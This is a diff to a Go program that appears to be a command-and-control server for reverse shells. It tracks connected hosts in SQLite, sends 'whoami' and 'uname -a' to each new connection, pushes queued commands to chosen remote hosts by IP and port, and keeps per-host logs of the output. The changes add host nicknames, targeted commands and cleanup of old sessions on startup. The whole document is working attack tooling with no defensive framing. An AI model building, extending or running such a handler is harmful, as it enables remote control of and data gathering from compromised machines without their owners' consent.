@@ -53,7 +53,9 @@ func initDB() {
 
 		_, err = db.Exec(`CREATE TABLE IF NOT EXISTS priority_commands (
 			id INTEGER PRIMARY KEY AUTOINCREMENT,
-			command TEXT NOT NULL
+			command TEXT NOT NULL,
+			ip TEXT,
+			port TEXT
 		);`)
 		if err != nil {
 			log.Fatalf("Failed to create table: %v", err)
@@ -65,8 +67,29 @@ func initDB() {
 			connected_at DATETIME DEFAULT CURRENT_TIMESTAMP,
 			uname TEXT,
 			user TEXT,
+			nickname TEXT,
 			PRIMARY KEY (ip, port)
 		);`)
+	}
+	db, err := sql.Open("sqlite3", dbPath)
+	if err != nil {
+		log.Fatalf("Failed to create DB: %v", err)
+	}
+	defer db.Close()
+
+	// Clear out old connections on startup
+	_, err = db.Exec("DELETE FROM connections")
+	if err != nil {
+		log.Fatalf("Failed to clear old connections: %v", err)
+	}
+
+	// Clear out command_output directory
+	logDir := "./command_output"
+	if _, err := os.Stat(logDir); !os.IsNotExist(err) {
+		err := os.RemoveAll(logDir)
+		if err != nil {
+			log.Fatalf("Failed to clear command_output directory: %v", err)
+		}
 	}
 }
 
@@ -102,12 +125,12 @@ func handleConnection(conn net.Conn, db *sql.DB) {
 	initialCommands := []string{"whoami", "uname -a"}
 	for _, cmd := range initialCommands {
 		cmdName := strings.SplitN(cmd, " ", 2)[0]
-		_, err := conn.Write([]byte( cmd + " | awk '{print \"[PRIORITY_" + cmdName + "] \"$0}'\n"))
+		_, err := conn.Write([]byte(cmd + " | awk '{print \"[PRIORITY_" + cmdName + "] \"$0}'\n"))
 		if err != nil {
 			log.Printf("Error writing to connection %s: %v\n", conn.RemoteAddr(), err)
 			return
 		}
-		
+
 		time.Sleep(1 * time.Second)
 	}
 
@@ -120,7 +143,12 @@ func handleConnection(conn net.Conn, db *sql.DB) {
 					_, err := conn.Write([]byte(command + " | awk '{print \"[PRIORITY:1] \"$0}'\n"))
 					fmt.Printf("Sent PRIORITY to %s: %s\n", conn.RemoteAddr(), command)
 					// append the command to the priority log file
-					f, err := os.OpenFile("priority1.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+					logDir := "./command_output"
+					if err := os.MkdirAll(logDir, 0755); err != nil {
+						log.Printf("Error creating log directory: %v\n", err)
+					}
+					logFile := fmt.Sprintf("%s/%s_%s_command.log", logDir, ip, port)
+					f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 					if err == nil {
 						_, _ = f.WriteString("[COMMAND]" + command + "\n")
 						f.Close()
@@ -166,7 +194,12 @@ func handleConnection(conn net.Conn, db *sql.DB) {
 			if strings.HasPrefix(line, "[PRIORITY:1]") {
 				fmt.Printf("Received PRIORITY:1 from %s: %s\n", conn.RemoteAddr(), strings.TrimPrefix(line, "[PRIORITY:1] "))
 				// Append to file
-				f, err := os.OpenFile("priority1.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+				logDir := "./command_output"
+				if err := os.MkdirAll(logDir, 0755); err != nil {
+					log.Printf("Error creating log directory: %v\n", err)
+				}
+				logFile := fmt.Sprintf("%s/%s_%s_command.log", logDir, ip, port)
+				f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 				if err == nil {
 					_, _ = f.WriteString(strings.TrimPrefix(line, "[PRIORITY:1] ") + "\n")
 					f.Close()
